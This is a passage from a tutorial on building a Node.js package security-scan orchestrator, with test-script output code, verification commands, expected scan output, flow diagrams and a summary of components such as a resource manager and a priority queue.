            if (count > 0) {
                const color = level === 'CRITICAL' ? chalk.red.bold :
                             level === 'HIGH' ? chalk.yellow.bold :
                             level === 'MEDIUM' ? chalk.yellow :
                             level === 'LOW' ? chalk.green :
                             chalk.gray;
                console.log(`   ${color(level.padEnd(10))}: ${count}`);
            }
        }
        
        // Print recommendations
        if (results.recommendations.length > 0) {
            console.log('\n' + chalk.bold('💡 Recommendations:'));
            for (const rec of results.recommendations) {
                const recColor = rec.severity === 'CRITICAL' ? chalk.red.bold :
                                 rec.severity === 'HIGH' ? chalk.yellow.bold :
                                 chalk.yellow;
                console.log(`   ${recColor(rec.action)}: ${rec.message}`);
                if (rec.packages && rec.packages.length > 0) {
                    console.log(`      Packages: ${rec.packages.slice(0, 5).join(', ')}${rec.packages.length > 5 ? '...' : ''}`);
                }
            }
        }
        
        // Show CI report
        console.log('\n' + chalk.bold('🔄 CI/CD Report:'));
        const ciReport = orchestrator.getCIReport();
        console.log(`   Status: ${ciReport.status === 'PASS' ? chalk.green('PASS') : chalk.red('FAIL')}`);
        console.log(`   Critical Issues: ${ciReport.summary.critical}`);
        console.log(`   High Issues: ${ciReport.summary.high}`);
        console.log(`   Average Score: ${ciReport.summary.averageScore.toFixed(1)}`);
        
        console.log('\n' + chalk.green('📄 Full results saved to: orchestrator-results.json'));
        
        // Clean up
        // fs.rmSync(testDir, { recursive: true, force: true });
        
    } catch (error) {
        console.error(chalk.red(`❌ Scan failed: ${error.message}`));
        console.error(error.stack);
    }
}

// Run the test
testOrchestrator().catch(console.error);
```

---

## The Verification: Testing the Orchestrator

**✅ Verification Step 1: Run the Orchestrator Test**

```bash
# From the phase-3 directory
node test-orchestrator.js
```

**Expected output:**

```
🧪 Testing Orchestrator

📁 Created 50 test packages in: .../test-packages-large

🚀 Starting orchestrator scan...

🚀 Starting Orchestrated Security Scan
📦 50 packages to scan
⚡ Concurrency: 5
💾 Max Memory: 80%
🔄 Max CPU: 80%
⏱️  Timeout: 30000ms
🔄 Retries: 2

📋 Adding packages to queue...
✔ Added 50 packages to queue
🔄 Processing packages with resource management...
📊 Memory: 45.2% | CPU: 23.5%
📊 Memory: 48.7% | CPU: 31.2%
...
✅ All packages processed (50 total)

✅ Orchestrator Scan Complete!
⏱️  Duration: 18.45s
📦 Packages: 50
✅ Successful: 48
❌ Failed: 2

🎯 Risk Distribution:
   CRITICAL  : 0
   HIGH      : 2
   MEDIUM    : 8
   LOW       : 30
   UNKNOWN   : 10

💡 Recommendations:
   REVIEW: Review 2 packages with high risk
      Packages: package-10, package-20
   INVESTIGATE: Investigate 2 failed package scans
      Packages: package-7, package-42

🔄 CI/CD Report:
   Status: FAIL
   Critical Issues: 0
   High Issues: 2
   Average Score: 24.6

📄 Full results saved to: orchestrator-results.json
```

**✅ Verification Step 2: Check Resource Manager Health**

```bash
# Test resource manager independently
node -e "
const ResourceManager = require('./src/resource-manager');
const manager = new ResourceManager();
setInterval(() => {
    const health = manager.checkHealth();
    console.log('Health:', health.isHealthy ? 'OK' : 'WARNING');
}, 1000);
"
```

**✅ Verification Step 3: Test Priority Queue**

```bash
# Test priority queue
node -e "
const PriorityQueue = require('./src/priority-queue');
const queue = new PriorityQueue();
queue.add({ name: 'low-pkg' }, 'low');
queue.add({ name: 'critical-pkg' }, 'critical');
queue.add({ name: 'high-pkg' }, 'high');

let item;
while ((item = queue.next()) !== null) {
    console.log('Processing:', item.item.name, '(priority:', item.priority + ')');
    queue.complete(item.id);
}
"
```

**✅ Verification Step 4: Generate CI/CD Report**

```bash
# Generate CI/CD report
node test-orchestrator.js && cat orchestrator-results.json | json_pp | head -50
```

---

## Understanding the Orchestration Flow

### 1. Package Addition Phase

```
packages → priority queue → categorized by priority
         ↓
   critical: immediate processing
   high: next in line
   medium: normal processing
   low: background processing
```

### 2. Resource Management Phase

```
each worker → check resources → if OK, process
                              ↓
                       if NOT OK, wait
```

### 3. Processing Phase

```
queue → get next item → scan package → stream result
         ↓
   failed → retry (max 2 times) → if still fails, mark as failed
```

### 4. Results Phase

```
results → streaming → buffer → flush to file
         ↓
   generate summary → recommendations → CI/CD report
```

---

## Key Takeaways from Phase 3, Part 2

1. **Resource management prevents system exhaustion** - Memory and CPU thresholds protect the system

2. **Priority queuing ensures critical packages get processed first** - Not all packages are equally important

3. **Streaming results enable real-time monitoring** - Results are available as soon as they're processed

4. **Health checks provide continuous monitoring** - System health is constantly assessed

5. **Graceful shutdown prevents data loss** - Flushes buffers before closing

6. **CI/CD integration is built-in** - Reports are formatted for automated pipelines

7. **Production-ready error handling** - Retries, timeouts, and resource limits prevent catastrophic failures

In the final phase, we'll integrate Large Language Models into our security workflow, using AI to provide context, explanations, and intelligent triage while maintaining deterministic security controls.

---

## Reference: Orchestration Components Summary

| Component | Purpose | Key Features |
|-----------|---------|--------------|
| **ResourceManager** | System resource management | Memory/CPU monitoring, health checks, resource waiting |
| **PriorityQueue** | Priority-based queuing | 5 priority levels, status tracking, statistics |
| **StreamingResults** | Real-time result streaming | Buffering, multiple formats, summary generation |
| **Orchestrator** | Main orchestration | Workflow management, component integration, CI/CD reporting |
